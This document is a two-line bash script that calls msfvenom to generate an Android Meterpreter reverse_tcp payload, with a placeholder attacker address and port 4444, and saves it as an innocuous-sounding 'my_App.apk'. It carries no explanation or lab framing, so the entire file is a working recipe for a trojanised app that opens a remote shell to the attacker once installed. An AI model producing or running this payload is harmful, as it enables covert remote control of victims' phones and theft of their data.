#!/bin/bash


msfvenom -p android/meterpreter/reverse_tcp LHOST="YOUR LOCAL IP" LPORT=4444 R > my_App.apk
